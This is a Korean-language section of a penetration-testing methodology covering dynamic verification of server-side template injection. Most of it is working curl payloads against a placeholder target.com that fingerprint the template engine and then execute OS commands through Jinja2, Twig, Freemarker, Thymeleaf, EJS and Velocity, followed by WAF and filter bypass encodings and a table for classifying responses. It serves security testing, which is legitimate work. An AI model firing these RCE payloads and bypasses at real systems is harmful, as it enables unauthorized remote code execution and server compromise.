### Phase 2: 동적 테스트 (검증)


**Step 1: 수학 연산 페이로드로 엔진 식별**

| 페이로드 | 결과 | 엔진 |
|----------|------|------|
| `{{7*7}}` | `49` | Jinja2/Twig/Nunjucks/Handlebars |
| `{{7*'7'}}` | `7777777` | Jinja2 (문자열 반복) |
| `{{7*'7'}}` | `49` | Twig |
| `${7*7}` | `49` | Mako/Thymeleaf/Freemarker/Velocity |
| `<%= 7*7 %>` | `49` | EJS/ERB |
| `#{7*7}` | `49` | Pug/Jade/Slim |
| `${{7*7}}` | `49` | Thymeleaf (Spring EL) |

```
# Jinja2/Twig/Nunjucks 테스트
curl -s "https://target.com/search?q=%7B%7B7*7%7D%7D" | grep "49"

# EJS/ERB 테스트
curl -s "https://target.com/search?q=%3C%25%3D+7*7+%25%3E" | grep "49"

# Mako/Thymeleaf 테스트
curl -s "https://target.com/search?q=%24%7B7*7%7D" | grep "49"

# Thymeleaf Spring EL 테스트
curl -s "https://target.com/search?q=%24%7B%7B7*7%7D%7D" | grep "49"

# POST 바디 테스트 (입력이 바디에 있는 경우)
curl -s -X POST "https://target.com/api/render" \
  -H "Content-Type: application/json" \
  -d '{"template":"{{7*7}}"}'
```

---

**Step 2: 엔진별 심화 테스트 (엔진 식별 후)**

**Jinja2 (Python):**
```
# 설정 객체 접근
curl -s "https://target.com/search?q=%7B%7Bconfig%7D%7D"

# 코드 실행 (MRO chain)
curl -s "https://target.com/search?q=%7B%7B''.__class__.__mro__[1].__subclasses__()%7D%7D"

# OS 명령 실행
curl -s "https://target.com/search?q=%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('id').read()%7D%7D"
```

**Twig (PHP):**
```
# 환경 정보
curl -s "https://target.com/search?q=%7B%7B_self.env.display('id')%7D%7D"

# Twig 3.x+ filter 활용
curl -s "https://target.com/search?q=%7B%7B['id']|filter('system')%7D%7D"
```

**Freemarker (Java):**
```
# 코드 실행
curl -s "https://target.com/search?q=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D"

# assign + exec
curl -s "https://target.com/search?q=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7Bex%28%22id%22%29%7D"
```

**Thymeleaf (Java/Spring):**
```
# Spring EL 표현식
curl -s "https://target.com/search?q=__$%7BT(java.lang.Runtime).getRuntime().exec('id')%7D__::.x"
```

**EJS (Node.js):**
```
# 코드 실행
curl -s "https://target.com/search?q=%3C%25%3D+global.process.mainModule.require('child_process').execSync('id').toString()+%25%3E"
```

**Velocity (Java):**
```
curl -s "https://target.com/search?q=%23set(%24x%3D%27%27)%23set(%24rt%3D%24x.class.forName('java.lang.Runtime'))%23set(%24chr%3D%24x.class.forName('java.lang.Character'))%23set(%24str%3D%24x.class.forName('java.lang.String'))%23set(%24ex%3D%24rt.getRuntime().exec('id'))"
```

---

**우회 기법 (필터/WAF 차단 시):**

Jinja2 우회:
```
# attr() 필터 체인 (점/브래킷 필터 우회)
curl -s "https://target.com/search?q=%7B%7Brequest|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()%7D%7D"

# 문자열 연결 (키워드 필터 우회)
curl -s "https://target.com/search?q=%7B%7B''['__cla'%2B'ss__']%7D%7D"

# hex/octal 인코딩
curl -s "https://target.com/search?q=%7B%7B''['\x5f\x5fclass\x5f\x5f']%7D%7D"

# {%25 인코딩 (% 필터 우회)
curl -s "https://target.com/search?q=%7B%2525+import+os+%2525%7D%7B%7Bos.popen('id').read()%7D%7D"
```

Twig 우회:
```
# 대체 필터 활용
curl -s "https://target.com/search?q=%7B%7B['id']|map('system')%7D%7D"
curl -s "https://target.com/search?q=%7B%7B['id']|sort('system')%7D%7D"
```

공통 인코딩 우회:
```
# URL 이중 인코딩
curl -s "https://target.com/search?q=%257B%257B7*7%257D%257D"

# Unicode 이스케이프
curl -s "https://target.com/search?q=\u007B\u007B7*7\u007D\u007D"
```

---

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 응답에 `49` 반환 (수학 연산 결과) | 확인됨 (SSTI 존재) |
| 응답에 config/환경 변수/클래스 목록 반영 | 확인됨 (정보 노출) |
| 응답에 명령어 실행 결과 반영 (`uid=`, hostname 등) | 확인됨 (RCE) |
| `{{7*7}}`이 `{{7*7}}`로 그대로 반영 | 안전 (템플릿으로 처리되지 않음) |
| 입력이 HTML 인코딩되어 반영 (`&#123;&#123;`) | 안전 (출력 인코딩 동작) |
| `TemplateSyntaxError`, `UndefinedError` 등 템플릿 에러 | 후보 (템플릿 처리는 확인, 주입은 불완전) |
| 500 에러 + 스택 트레이스에 템플릿 엔진 언급 | 후보 (엔진 존재 확인, 추가 시도 필요) |
| WAF 차단 (403) | 우회 기법 시도 |

**검증 기준:**
- **확인됨**: 동적 테스트로 응답에서 수학 연산 결과(`49`) 또는 코드 실행 결과가 반환된 것을 직접 확인함
